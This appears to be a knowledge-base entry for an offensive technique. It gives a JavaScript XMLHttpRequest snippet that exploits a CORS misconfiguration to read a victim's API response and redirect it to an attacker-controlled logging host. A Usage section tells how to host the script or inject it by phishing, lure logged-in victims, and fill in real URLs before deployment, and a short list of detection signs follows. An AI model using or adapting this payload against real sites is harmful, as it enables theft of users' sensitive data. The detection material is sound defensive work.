---
id: 741dd0de-5501-411f-bf7d-64aa4775c401
type: code
language: js
verified: true
created_at: '2023-04-06T03:55:54.360052+00:00'
updated_at: '2023-04-06T03:55:54.363437+00:00'
tags:
  - cors-exploitation
  - data-exfiltration
  - javascript
platforms:
  - Web
validated: true
---

# JavaScript-XMLHttpRequest-CORS-Exfiltration

## Code

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

## Description

This JavaScript code exploits a CORS misconfiguration by sending a cross-origin GET request using XMLHttpRequest to a vulnerable API endpoint. Upon receiving the response, it exfiltrates the data by redirecting the browser to an attacker-controlled logging server with the response text as a URL parameter. The code is designed for execution in a browser context on an attacker-controlled page, allowing theft of sensitive API data when a victim visits the page.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `https://api.internal.example.com/endpoint` | The vulnerable API endpoint URL to target | `https://api.victim.com/user/profile` |
| `//atttacker.net/log` | Attacker-controlled logging server URL (protocol-relative for flexibility) | `//evil.com/exfil` |

## Usage

Embed this script in an HTML page hosted on the attacker's domain or inject it via phishing/email. Lure the victim to visit the page while logged into the target site. The script runs automatically in the browser, sending the request and exfiltrating data without user interaction. Replace placeholders with actual URLs before deployment. This is typically used in proof-of-concept demonstrations or as part of a broader phishing campaign for initial access.

## Detection

- Browser developer tools or network monitoring showing unexpected cross-origin requests to internal APIs.
- Server logs on the target domain revealing requests from untrusted origins without credentials.
- Anomalous redirects or query parameters on the attacker's logging domain containing sensitive data.
- Endpoint protection platforms (EPP) or browser extensions that flag XMLHttpRequest to internal resources from external pages.
- Web Application Firewall (WAF) rules detecting wildcard CORS usage or unusual exfiltration patterns.

## Related

- [[procedures/CORS-Misconfiguration-Exploitation-with-Wildcard-Origin-and-No-Credentials]]
